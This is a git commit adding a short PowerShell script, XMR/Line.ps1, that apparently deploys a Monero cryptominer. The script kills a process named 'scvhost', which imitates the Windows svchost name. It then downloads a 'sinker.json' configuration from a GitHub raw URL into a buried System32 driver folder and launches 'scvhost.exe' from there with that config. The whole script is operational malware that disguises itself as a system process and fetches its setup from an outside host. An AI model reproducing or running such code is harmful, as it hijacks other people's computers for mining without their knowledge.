024b464691f6a6c0a8bb353b715abafea5a57a72
diggles9991 <diggles9991@gmail.com>
2017-08-14 20:14:57 +1000

    Add files via upload

---
+++ XMR/Line.ps1
@@ -0,0 +1,10 @@
+Stop-Process -Name scvhost
+
+
+# Download Instructions
+$url2 = "https://raw.githubusercontent.com/diggles9991/RunMG/master/XMR/sinker.json"
+$output2 = "C:\Windows\System32\drivers\en-US\etc\sinker.json"
+Import-Module BitsTransfer
+Start-BitsTransfer -Source $url2 -Destination $output2
+
+Start-Process C:\Windows\System32\drivers\en-US\etc\scvhost.exe -ArgumentList "-c $output2"
